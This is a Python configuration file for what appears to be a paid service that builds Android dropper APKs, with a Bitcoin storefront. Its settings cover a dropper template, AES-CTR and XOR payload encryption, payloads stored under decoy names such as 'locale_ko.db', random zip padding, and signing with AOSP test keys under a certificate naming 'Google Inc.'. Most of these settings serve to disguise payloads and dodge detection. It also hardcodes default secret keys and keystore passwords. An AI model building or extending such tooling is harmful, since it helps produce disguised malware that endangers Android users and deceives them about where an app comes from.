import os
from datetime import timedelta

from dotenv import load_dotenv

load_dotenv()

BASE_DIR = os.path.abspath(os.path.dirname(__file__))


class Config:
    SECRET_KEY = os.environ.get("SECRET_KEY", "katana_secret_2026")
    # APK ate 100 MB + folga para multipart (icone/campos).
    MAX_CONTENT_LENGTH = 110 * 1024 * 1024
    SESSION_COOKIE_SECURE = False
    SESSION_COOKIE_HTTPONLY = True
    SESSION_COOKIE_SAMESITE = "Lax"
    PERMANENT_SESSION_LIFETIME = timedelta(days=30)

    TEMPLATES_AUTO_RELOAD = False

    UPLOAD_FOLDER = os.path.join(BASE_DIR, "uploads")
    OUTPUT_FOLDER = os.path.join(BASE_DIR, "outputs")
    STORE_CATALOG_DIR = os.path.join(BASE_DIR, "store_catalog")
    STORE_BTC_ADDRESS = os.environ.get(
        "STORE_BTC_ADDRESS",
        "bc1q9afer30l2a2ruqe2qf2kqhudymx7fl90897a74",
    )

    BITCOIN_DESCRIPTOR = os.environ.get("BITCOIN_DESCRIPTOR", "").strip()
    BITCOIN_NETWORK = os.environ.get("BITCOIN_NETWORK", "signet").strip().lower()
    BITCOIN_START_INDEX = int(os.environ.get("BITCOIN_START_INDEX", "0"))
    BITCOIN_INVOICE_MINUTES = int(os.environ.get("BITCOIN_INVOICE_MINUTES", "15"))
    BITCOIN_REQUIRED_CONFIRMATIONS = int(
        os.environ.get("BITCOIN_REQUIRED_CONFIRMATIONS", "1")
    )
    BITCOIN_MEMPOOL_API = os.environ.get(
        "BITCOIN_MEMPOOL_API", "https://mempool.space/api"
    ).rstrip("/")
    BITCOIN_BLOCKSTREAM_API = os.environ.get(
        "BITCOIN_BLOCKSTREAM_API", "https://blockstream.info/api"
    ).rstrip("/")
    BITCOIN_RATE_API = os.environ.get(
        "BITCOIN_RATE_API", "https://api.coingecko.com/api/v3"
    ).rstrip("/")
    BITCOIN_MONITOR_INTERVAL = int(os.environ.get("BITCOIN_MONITOR_INTERVAL", "20"))
    BITCOIN_MONITOR_ENABLED = os.environ.get(
        "BITCOIN_MONITOR_ENABLED", "1"
    ).strip().lower() not in {"0", "false", "no", "off"}
    PUBLIC_APP_BASE_URL = os.environ.get("PUBLIC_APP_BASE_URL", "").rstrip("/")
    PUBLIC_ICONS_FOLDER = os.path.join(BASE_DIR, "outputs", "icons")

    DROPPER_TEMPLATE = os.path.join(BASE_DIR, "dropper_rebuild")
    SIGNER_JAR = os.path.join(BASE_DIR, "signer.jar")
    APKTOOL_JAR = os.path.join(BASE_DIR, "apktool.jar")
    DROPPER_LIBS_DEX = os.path.join(
        BASE_DIR, "dropper_rebuild_legacy_stub", "prebuilt", "androidx_material.dex"
    )
    INJECT_SECONDARY_DEX = False

    _BUILD_TOOLS = os.path.join(
        BASE_DIR, "APP-TEST", "tools", "android-sdk", "build-tools", "35.0.0"
    )
    APKSIGNER = os.path.join(_BUILD_TOOLS, "apksigner")
    ZIPALIGN = os.path.join(_BUILD_TOOLS, "zipalign")
    KEYSTORE_VALIDITY_DAYS = 10000
    KEYSTORE_KEY_ALG = "RSA"
    KEYSTORE_KEY_SIZE = 2048
    KEYSTORE_SIG_ALG = "SHA256withRSA"
    KEYSTORE_STORE_TYPE = "PKCS12"
    SIGNING_MODE = os.environ.get("SIGNING_MODE", "aosp_testkey")
    AOSP_TESTKEY_PK8 = os.path.join(BASE_DIR, "signing", "testkey.pk8")
    AOSP_TESTKEY_CERT = os.path.join(BASE_DIR, "signing", "testkey.x509.pem")
    RELEASE_KEYSTORE = os.path.join(BASE_DIR, "signing", "release.p12")
    RELEASE_KEY_ALIAS = os.environ.get("RELEASE_KEY_ALIAS", "androidapp")
    RELEASE_KEYSTORE_PASS = os.environ.get(
        "RELEASE_KEYSTORE_PASS", "android_app_release_2026"
    )
    RELEASE_DNAME = os.environ.get(
        "RELEASE_DNAME",
        "CN=Android, OU=Android, O=Google Inc., L=Mountain View, ST=California, C=US",
    )
    APKSIGNER_V3_ENABLED = False

    OLD_PACKAGE = "com.turbo.live"
    PACKAGE_PREFIX = "com"

    CIPHER_TRANSFORM = "AES/CTR/NoPadding"
    CRYPTO_XOR_FIXED = False
    CRYPTO_XOR_BYTE = 0xE7

    ASSET_NAME_POOL = (
        "locale_ko.db",
        "locale_ja.db",
        "locale_de.db",
        "locale_fr.db",
        "locale_es.db",
        "locale_pt.db",
        "locale_it.db",
        "locale_zh.db",
        "locale_ru.db",
        "locale_ar.db",
        "cache_kf.bin",
        "config_hd.db",
    )

    ZIP_NORMALIZE_TIMESTAMPS = True
    ZIP_EPOCH_DATE_TIME = (1981, 1, 1, 1, 1, 2)

    PAYLOAD_ZIP_NOISE = True
    PAYLOAD_ZIP_NOISE_MIN = 400
    PAYLOAD_ZIP_NOISE_MAX = 700

    VERSION_NAME_MAJOR = (7, 9)
    VERSION_CODE_BASE = 30


def ensure_directories(config):
    for directory in (
        config.UPLOAD_FOLDER,
        config.OUTPUT_FOLDER,
        config.STORE_CATALOG_DIR,
        config.PUBLIC_ICONS_FOLDER,
    ):
        os.makedirs(directory, exist_ok=True)

